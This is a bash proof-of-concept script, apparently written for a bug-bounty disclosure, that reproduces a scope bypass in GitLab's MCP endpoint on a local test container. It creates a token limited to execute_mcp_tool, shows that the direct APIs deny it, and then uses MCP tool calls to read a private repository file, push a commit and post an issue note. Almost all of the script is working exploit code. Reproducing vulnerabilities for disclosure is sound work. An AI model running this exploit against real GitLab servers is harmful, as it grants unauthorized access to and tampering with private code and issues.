#!/usr/bin/env bash
set -euo pipefail

BASE="${BASE:-http://gitlab.local:8080}"
CONTAINER="${CONTAINER:-gitlab}"
OUT="${OUT:-artifacts}"
mkdir -p "$OUT"

api() {
  local token="$1" method="$2" path="$3"; shift 3
  curl -sS --max-time 60 --fail-with-body --request "$method" \
    --header "PRIVATE-TOKEN: $token" "$@" "$BASE/api/v4$path"
}

echo "===== enable MCP + bootstrap root token ====="
docker cp security/gitlab-mcp-gpat/bootstrap.rb "$CONTAINER:/tmp/h1-mcp-bootstrap.rb"
echo "rails-bootstrap:start"
BOOT="$(timeout 180s docker exec "$CONTAINER" gitlab-rails runner /tmp/h1-mcp-bootstrap.rb)"
ROOT_TOKEN="$(printf '%s\n' "$BOOT" | sed -n 's/^H1_ROOT_TOKEN=//p' | tail -1)"
test -n "$ROOT_TOKEN"
echo "rails-bootstrap:done"

STAMP="$(date +%s)"
USERNAME="h1mcp$STAMP"
EMAIL="$USERNAME@example.test"
PASSWORD="Y7!mQ9#pV4@zN2_KR8_xC5_w${STAMP}"

echo "===== create isolated user/group/private project ====="
USER_JSON="$(api "$ROOT_TOKEN" POST /users \
  --data-urlencode "username=$USERNAME" \
  --data-urlencode "name=H1 MCP GPAT Test" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASSWORD" \
  --data-urlencode "skip_confirmation=true")"
USER_ID="$(jq -r '.id' <<<"$USER_JSON")"

GROUP_JSON="$(api "$ROOT_TOKEN" POST /groups \
  --data-urlencode "name=h1-mcp-$STAMP" \
  --data-urlencode "path=h1-mcp-$STAMP" \
  --data-urlencode "visibility=private")"
GROUP_ID="$(jq -r '.id' <<<"$GROUP_JSON")"

PROJECT_JSON="$(api "$ROOT_TOKEN" POST /projects \
  --data-urlencode "name=private-target" \
  --data-urlencode "path=private-target" \
  --data-urlencode "namespace_id=$GROUP_ID" \
  --data-urlencode "visibility=private" \
  --data-urlencode "initialize_with_readme=true")"
PROJECT_ID="$(jq -r '.id' <<<"$PROJECT_JSON")"
PROJECT_PATH="$(jq -r '.path_with_namespace' <<<"$PROJECT_JSON")"

api "$ROOT_TOKEN" POST "/groups/$GROUP_ID/members" \
  --data-urlencode "user_id=$USER_ID" \
  --data-urlencode "access_level=30" >"$OUT/membership.json"

printf '%s\n' "$USER_JSON" >"$OUT/user.json"
printf '%s\n' "$PROJECT_JSON" >"$OUT/project.json"

echo "===== Seed one private repository fixture ====="
FIXTURE_VALUE="H1_PRIVATE_FIXTURE_$STAMP"
SEED_OK=false
for i in $(seq 1 12); do
  SEED_BODY="$OUT/seed-file-attempt.json"
  SEED_STATUS="$(curl -sS -o "$SEED_BODY" -w '%{http_code}' \
    --request POST \
    --header "PRIVATE-TOKEN: $ROOT_TOKEN" \
    --data-urlencode "branch=main" \
    --data-urlencode "commit_message=Add local H1 fixture" \
    --data-urlencode "content=$FIXTURE_VALUE" \
    "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-private-fixture.txt")"
  if [[ "$SEED_STATUS" == "201" ]]; then
    SEED_OK=true
    cp "$SEED_BODY" "$OUT/seed-file.json"
    break
  fi
  echo "fixture seed attempt $i returned HTTP $SEED_STATUS"
  cat "$SEED_BODY" || true
  sleep 2
done
if [[ "$SEED_OK" != true ]]; then
  echo "Failed to seed private fixture"
  exit 26
fi

echo "===== create unprotected write target branch ====="
WRITE_BRANCH="h1-write-target"
api "$ROOT_TOKEN" POST "/projects/$PROJECT_ID/repository/branches" \
  --data-urlencode "branch=$WRITE_BRANCH" \
  --data-urlencode "ref=main" >"$OUT/write-branch.json"

echo "===== create GPAT with ONLY execute_mcp_tool on user boundary ====="
docker cp security/gitlab-mcp-gpat/create_gpat.rb "$CONTAINER:/tmp/h1-create-mcp-gpat.rb"
echo "gpat-create:start"
SETUP="$(timeout 180s docker exec -e H1_USER_ID="$USER_ID" "$CONTAINER" gitlab-rails runner /tmp/h1-create-mcp-gpat.rb)"
printf '%s\n' "$SETUP" | sed -E 's/(H1_GPAT=).*/\1[REDACTED]/' | tee "$OUT/gpat-scope.txt"
GPAT="$(printf '%s\n' "$SETUP" | sed -n 's/^H1_GPAT=//p' | tail -1)"
test -n "$GPAT"
echo "gpat-create:done"

echo "===== CONTROL: direct GraphQL with same GPAT must NOT read private project ====="
DIRECT_BODY="$(jq -cn --arg q "query { project(fullPath: \"$PROJECT_PATH\") { id name fullPath visibility webUrl } }" '{query:$q}')"
DIRECT="$(curl -sS --max-time 60 --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$DIRECT_BODY" "$BASE/api/graphql")"
printf '%s\n' "$DIRECT" | tee "$OUT/direct-graphql.json"

if jq -e '.data.project != null' <<<"$DIRECT" >/dev/null 2>&1; then
  echo "ISOLATION_INVALID: direct GraphQL already reads project"
  exit 21
fi

echo "===== MCP: same GPAT calls get_project on same private project ====="
MCP_BODY="$(jq -cn --arg p "$PROJECT_PATH" '{
  jsonrpc:"2.0",
  id:"h1-1",
  method:"tools/call",
  params:{name:"get_project",arguments:{project_id:$p}}
}')"

MCP="$(curl -sS --max-time 60 --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$MCP_BODY" "$BASE/api/v4/mcp")"
printf '%s\n' "$MCP" | tee "$OUT/mcp-get-project.json"

MCP_PATH="$(jq -r '.result.structuredContent.path_with_namespace // .result.structuredContent.fullPath // empty' <<<"$MCP" 2>/dev/null || true)"
if [[ -z "$MCP_PATH" ]]; then
  MCP_PATH="$(jq -r '.result.content[0].text // empty' <<<"$MCP" 2>/dev/null | jq -r '.path_with_namespace // .fullPath // empty' 2>/dev/null || true)"
fi

echo "===== READ CONTROL: direct repository-file API with same GPAT ====="
DIRECT_FILE_BODY="$OUT/direct-file-body.txt"
DIRECT_FILE_STATUS="$(curl -sS -o "$DIRECT_FILE_BODY" -w '%{http_code}' \
  -H "PRIVATE-TOKEN: $GPAT" \
  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-private-fixture.txt/raw?ref=main")"
printf '%s\n' "$DIRECT_FILE_STATUS" >"$OUT/direct-file-status.txt"
if [[ "$DIRECT_FILE_STATUS" == "200" ]]; then
  echo "ISOLATION_INVALID: direct repository-file API accepted token without read_repository_file"
  exit 25
fi

echo "===== MCP READ: same GPAT calls get_repository_file ====="
MCP_FILE_BODY="$(jq -cn --arg p "$PROJECT_PATH" '{
  jsonrpc:"2.0",
  id:"h1-file",
  method:"tools/call",
  params:{name:"get_repository_file",arguments:{project_id:$p,file_path:"h1-private-fixture.txt",ref:"main"}}
}')"
MCP_FILE="$(curl -sS --max-time 60 --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$MCP_FILE_BODY" "$BASE/api/v4/mcp")"
printf '%s\n' "$MCP_FILE" | tee "$OUT/mcp-get-repository-file.json"
MCP_FILE_CONTENT="$(jq -r '.result.structuredContent.content // empty' <<<"$MCP_FILE" 2>/dev/null || true)"
if [[ -z "$MCP_FILE_CONTENT" ]]; then
  MCP_FILE_CONTENT="$(jq -r '.result.content[0].text // empty' <<<"$MCP_FILE" 2>/dev/null | jq -r '.content // empty' 2>/dev/null || true)"
fi
FIXTURE_MATCH=false
if [[ "$MCP_FILE_CONTENT" == *"$FIXTURE_VALUE"* ]]; then
  FIXTURE_MATCH=true
fi

echo "===== REPOSITORY WRITE CONTROL: direct API with same GPAT must be denied ====="
REPO_WRITE_VALUE="H1_MCP_WRITE_PROOF_$STAMP"
DIRECT_WRITE_BODY="$OUT/direct-repo-write-body.json"
DIRECT_WRITE_STATUS="$(curl -sS -o "$DIRECT_WRITE_BODY" -w '%{http_code}' \
  --request POST \
  --header "PRIVATE-TOKEN: $GPAT" \
  --data-urlencode "branch=$WRITE_BRANCH" \
  --data-urlencode "commit_message=Direct GPAT write control" \
  --data-urlencode "content=$REPO_WRITE_VALUE" \
  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-direct-write-control.txt")"
printf '%s\n' "$DIRECT_WRITE_STATUS" >"$OUT/direct-repo-write-status.txt"
if [[ "$DIRECT_WRITE_STATUS" == "201" ]]; then
  echo "ISOLATION_INVALID: direct repository write accepted token without push_code"
  exit 27
fi

echo "===== REPOSITORY WRITE EXPLOIT: same MCP-only GPAT calls add_commit ====="
MCP_COMMIT_BODY="$(jq -cn --arg p "$PROJECT_PATH" --arg branch "$WRITE_BRANCH" --arg content "$REPO_WRITE_VALUE" '{
  jsonrpc:"2.0",
  id:"h1-commit",
  method:"tools/call",
  params:{
    name:"add_commit",
    arguments:{
      project_id:$p,
      branch:$branch,
      commit_message:"H1 MCP granular PAT repository write proof",
      actions:[{action:"create",file_path:"h1-mcp-write-proof.txt",content:$content}]
    }
  }
}')"
MCP_COMMIT="$(curl -sS --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$MCP_COMMIT_BODY" "$BASE/api/v4/mcp")"
printf '%s\n' "$MCP_COMMIT" | tee "$OUT/mcp-add-commit.json"

VERIFY_WRITE_BODY="$OUT/mcp-write-verify.txt"
VERIFY_WRITE_STATUS="$(curl -sS -o "$VERIFY_WRITE_BODY" -w '%{http_code}' \
  -H "PRIVATE-TOKEN: $ROOT_TOKEN" \
  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-mcp-write-proof.txt/raw?ref=$WRITE_BRANCH")"
MCP_COMMIT_MATCH=false
if [[ "$VERIFY_WRITE_STATUS" == "200" ]] && grep -Fqx "$REPO_WRITE_VALUE" "$VERIFY_WRITE_BODY"; then
  MCP_COMMIT_MATCH=true
fi

echo "===== WRITE IMPACT SETUP: create one owned test issue ====="
ISSUE_JSON="$(api "$ROOT_TOKEN" POST "/projects/$PROJECT_ID/issues" \
  --data-urlencode "title=H1 MCP granular PAT write proof $STAMP")"
printf '%s\n' "$ISSUE_JSON" >"$OUT/issue.json"
ISSUE_ID="$(jq -r '.id' <<<"$ISSUE_JSON")"
ISSUE_IID="$(jq -r '.iid' <<<"$ISSUE_JSON")"
NOTE_BODY="H1 MCP GPAT write proof $STAMP"
NOTEABLE_GID="gid://gitlab/Issue/$ISSUE_ID"

echo "===== MCP CONTROL: REST-backed get_issue must enforce read_issue and deny this GPAT ====="
MCP_REST_CONTROL_BODY="$(jq -cn --arg p "$PROJECT_PATH" --argjson iid "$ISSUE_IID" '{
  jsonrpc:"2.0",
  id:"h1-rest-control",
  method:"tools/call",
  params:{name:"get_issue",arguments:{id:$p,issue_iid:$iid}}
}')"
MCP_REST_CONTROL="$(curl -sS --max-time 60 --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$MCP_REST_CONTROL_BODY" "$BASE/api/v4/mcp")"
printf '%s\n' "$MCP_REST_CONTROL" | tee "$OUT/mcp-rest-get-issue-control.json"

if jq -e '.result.isError == false' <<<"$MCP_REST_CONTROL" >/dev/null 2>&1; then
  echo "ISOLATION_INVALID: REST-backed MCP get_issue accepted token without read_issue"
  exit 24
fi

echo "===== WRITE CONTROL: direct GraphQL with same GPAT must NOT create note ====="
DIRECT_NOTE_BODY="$(jq -cn --arg id "$NOTEABLE_GID" --arg body "$NOTE_BODY" '{
  query:"mutation($input: CreateNoteInput!) { createNote(input:$input) { note { id body } errors } }",
  variables:{input:{noteableId:$id,body:$body}}
}')"
DIRECT_NOTE="$(curl -sS --max-time 60 --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$DIRECT_NOTE_BODY" "$BASE/api/graphql")"
printf '%s\n' "$DIRECT_NOTE" | tee "$OUT/direct-graphql-create-note.json"

if jq -e '.data.createNote.note != null' <<<"$DIRECT_NOTE" >/dev/null 2>&1; then
  echo "ISOLATION_INVALID: direct GraphQL already created the note"
  exit 23
fi

echo "===== WRITE EXPLOIT: same MCP-only GPAT calls save_note ====="
MCP_NOTE_BODY="$(jq -cn --arg p "$PROJECT_PATH" --argjson iid "$ISSUE_IID" --arg body "$NOTE_BODY" '{
  jsonrpc:"2.0",
  id:"h1-2",
  method:"tools/call",
  params:{name:"save_note",arguments:{project_id:$p,work_item_iid:$iid,body:$body}}
}')"
MCP_NOTE="$(curl -sS --max-time 60 --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$MCP_NOTE_BODY" "$BASE/api/v4/mcp")"
printf '%s\n' "$MCP_NOTE" | tee "$OUT/mcp-save-note.json"

NOTES="$(api "$ROOT_TOKEN" GET "/projects/$PROJECT_ID/issues/$ISSUE_IID/notes")"
printf '%s\n' "$NOTES" >"$OUT/notes-after.json"
WRITE_COUNT="$(jq --arg body "$NOTE_BODY" '[.[] | select(.body == $body)] | length' <<<"$NOTES")"

{
  echo "GitLab: 19.4.1-ee.0"
  echo "Project: $PROJECT_PATH"
  echo "Granular PAT scope: execute_mcp_tool @ user boundary only"
  echo "Direct GraphQL project result: $(jq -c '.data.project // null' <<<"$DIRECT")"
  echo "MCP returned project path: ${MCP_PATH:-<none>}"
  echo "Direct repository-file API status: $DIRECT_FILE_STATUS"
  echo "MCP private fixture recovered: $FIXTURE_MATCH"
  echo "Direct repository write status: $DIRECT_WRITE_STATUS"
  echo "MCP repository write verified: $MCP_COMMIT_MATCH"
  echo "MCP REST get_issue control isError: $(jq -r '.result.isError // "no-result"' <<<"$MCP_REST_CONTROL")"
  echo "Direct GraphQL create-note result: $(jq -c '.data.createNote // null' <<<"$DIRECT_NOTE")"
  echo "MCP-created matching note count: $WRITE_COUNT"
} | tee "$OUT/summary.txt"

if [[ "$MCP_PATH" == "$PROJECT_PATH" && "$DIRECT_FILE_STATUS" != "200" && "$FIXTURE_MATCH" == true && "$DIRECT_WRITE_STATUS" != "201" && "$MCP_COMMIT_MATCH" == true && "$WRITE_COUNT" -ge 1 ]]; then
  echo "H1_RESULT=PASS granular-token private-repository read + repository-write + note-write scope bypass via MCP GraphQL tools" | tee -a "$OUT/summary.txt"
  exit 0
fi

echo "H1_RESULT=NOT_REPRODUCED" | tee -a "$OUT/summary.txt"
exit 22
